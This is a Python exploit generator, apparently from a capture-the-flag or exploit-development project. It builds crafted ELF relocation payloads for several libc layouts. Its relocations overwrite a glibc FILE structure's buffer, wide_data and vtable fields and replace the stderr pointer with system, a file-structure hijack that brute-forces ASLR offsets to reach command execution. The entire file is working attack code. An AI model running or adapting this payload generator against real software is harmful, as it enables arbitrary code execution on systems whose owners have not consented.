import argparse
import importlib.util
from pathlib import Path


HERE = Path(__file__).resolve().parent
spec = importlib.util.spec_from_file_location("dlx_chain_builder", HERE / "dlx_chain_builder.py")
builder_mod = importlib.util.module_from_spec(spec)
spec.loader.exec_module(builder_mod)

R_DLX_NONE = 0
R_DLX_RELOC_16 = 2

EXPECTED_RELOCS = 25
DEBUG_SIZE = 144

OFF_IO = -0x46A0
OFF_SEC = 0xB20
RBASE = 0x1F0

FILE_FLAGS = OFF_IO
FILE_BUF_BASE = OFF_IO + 0x20
FILE_SYSTEM_SLOT = OFF_IO + 0x68
FILE_WIDE_DATA = OFF_IO + 0xA0
FILE_VTABLE = OFF_IO + 0xD8
SECTION_SIZE_LOW = OFF_SEC + 0x38
SECTION_SIZE_HIGH = OFF_SEC + 0x3C

BUF_TO_FILE_BE32_DELTAS = (0xEF210000, 0xF020FF00)
WIDE_TO_FAKE_BE32_DELTAS = (0x4FFF0000,)
STDERR_TO_SYSTEM_BE32_DELTAS = (
    0x7042E500,
    0x6F42E600,
    0x7043E4FF,
    0x6F43E5FF,
    0x7043E5FF,
    0x6F43E6FF,
)
FILE_JUMPS_TO_WFILE_OVERFLOW_FINISH_BE16 = 0x0002

LAYOUTS = (
    {
        "name": "orig",
        "off_io": OFF_IO,
        "off_sec": OFF_SEC,
        "sec_size_offset": 0x38,
        "rbase": RBASE,
        "buf_deltas": BUF_TO_FILE_BE32_DELTAS,
        "wide_deltas": WIDE_TO_FAKE_BE32_DELTAS,
        "system_deltas": STDERR_TO_SYSTEM_BE32_DELTAS,
    },
    {
        "name": "wsl2404",
        "off_io": -0x3690,
        "off_sec": 0xBB0,
        "sec_size_offset": 0x38,
        "rbase": 0x220,
        "buf_deltas": (0x702FFF00, 0x6F300000),
        "wide_deltas": WIDE_TO_FAKE_BE32_DELTAS,
        "system_deltas": STDERR_TO_SYSTEM_BE32_DELTAS,
    },
    {
        "name": "gnu2461",
        "off_io": -0x3690,
        "off_sec": 0xBB8,
        "sec_size_offset": 0x40,
        "rbase": 0x190,
        "buf_deltas": (0x702FFF00, 0x6F300000),
        "wide_deltas": WIDE_TO_FAKE_BE32_DELTAS,
        "system_deltas": STDERR_TO_SYSTEM_BE32_DELTAS,
    },
)


def add_pi16_reloc(chain, target, delta, note):
    actual_idx = len(chain.relocs) + (2 if target < 0 else 0)
    chain._set_address_field(actual_idx, target & 0xFFFFFFFF)
    if target < 0:
        chain._patch_negative_address_for_index(actual_idx)
    idx = len(chain.relocs)
    chain.relocs.append((target & 0xFFFFFFFF, delta & 0xFFFFFFFF, R_DLX_RELOC_16))
    chain.notes.append((idx, target, delta & 0xFFFFFFFF, note))
    chain._set_address_field(idx, target & 0xFFFFFFFF)


def base_memory(flag_byte4, off_io, off_sec, rbase):
    memory_base = off_io - 0x100
    memory_end = max(rbase + EXPECTED_RELOCS * 32 + 0x80, off_sec + 0x80)
    memory = bytearray(memory_end - memory_base)
    flags_idx = off_io - memory_base
    memory[flags_idx : flags_idx + 8] = bytes([0x88, 0x24, 0xAD, 0xFB, flag_byte4, 0, 0, 0])
    return memory_base, memory


def build(out_dir):
    out_dir.mkdir(parents=True, exist_ok=True)
    outputs = []
    for layout in LAYOUTS:
        off_io = layout["off_io"]
        off_sec = layout["off_sec"]
        rbase = layout["rbase"]
        file_flags = off_io
        file_buf_base = off_io + 0x20
        file_system_slot = off_io + 0x68
        file_wide_data = off_io + 0xA0
        file_vtable = off_io + 0xD8
        section_size_low = off_sec + layout["sec_size_offset"]
        section_size_high = section_size_low + 4

        for flag_byte4 in (0x05, 0x06):
            for buf_delta in layout["buf_deltas"]:
                for wide_delta in layout["wide_deltas"]:
                    for system_delta in layout["system_deltas"]:
                        memory_base, memory = base_memory(flag_byte4, off_io, off_sec, rbase)
                        chain = builder_mod.ChainBuilder(DEBUG_SIZE, rbase, memory_base, memory)

                        chain.write_bytes4(file_flags, b"P\x00\x00\x00")
                        chain.write_bytes4(section_size_low, b"\xff\xff\xff\xff")
                        chain.write_bytes4(section_size_high, b"\xff\xff\xff\xff")
                        chain.add_pi32_reloc(file_buf_base, buf_delta, "FILE+0x20 input buffer pointer -> FILE fake wide vtable")
                        chain.add_pi32_reloc(file_system_slot, system_delta, "FILE+0x68 _IO_2_1_stderr_ -> system")
                        chain.add_pi32_reloc(file_wide_data, wide_delta, "FILE+0xa0 real wide_data -> FILE-0xc0 fake wide_data")
                        add_pi16_reloc(
                            chain,
                            file_vtable,
                            FILE_JUMPS_TO_WFILE_OVERFLOW_FINISH_BE16,
                            "FILE+0xd8 _IO_file_jumps -> interior vtable with finish=_IO_wfile_overflow",
                        )

                        while len(chain.relocs) < EXPECTED_RELOCS:
                            chain.relocs.append((0, 0, R_DLX_NONE))
                            chain.notes.append((len(chain.relocs) - 1, 0, 0, "pad R_DLX_NONE"))
                        if len(chain.relocs) != EXPECTED_RELOCS:
                            raise ValueError(f"unexpected reloc count {len(chain.relocs)}")

                        name = (
                            f"dlx_calc_aslr_{layout['name']}_f{flag_byte4:02x}_"
                            f"b{buf_delta:08x}_s{system_delta:08x}"
                        )
                        out = out_dir / f"{name}.bin"
                        notes = out_dir / f"{name}.notes"
                        out.write_bytes(builder_mod.build_elf(DEBUG_SIZE, chain.relocs))
                        notes.write_text(
                            "\n".join(
                                [
                                    f"layout={layout['name']}",
                                    f"flag_byte4=0x{flag_byte4:02x}",
                                    f"buf_delta=0x{buf_delta:08x}",
                                    f"wide_delta=0x{wide_delta:08x}",
                                    f"system_delta=0x{system_delta:08x}",
                                    "command=P",
                                    f"off_io={off_io:#x} off_sec={off_sec:#x} rbase={rbase:#x}",
                                    f"sec_size_offset={layout['sec_size_offset']:#x}",
                                    "",
                                ]
                                + [
                                    f"{idx:03d} target={target:#x} sym=0x{symv:08x} {note}"
                                    for idx, target, symv, note in chain.notes
                                ]
                            )
                            + "\n",
                            encoding="ascii",
                        )
                        outputs.append(out)
    return outputs


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--out-dir", type=Path, default=HERE / "payloads")
    args = ap.parse_args()
    for out in build(args.out_dir):
        print(out.resolve())


if __name__ == "__main__":
    main()
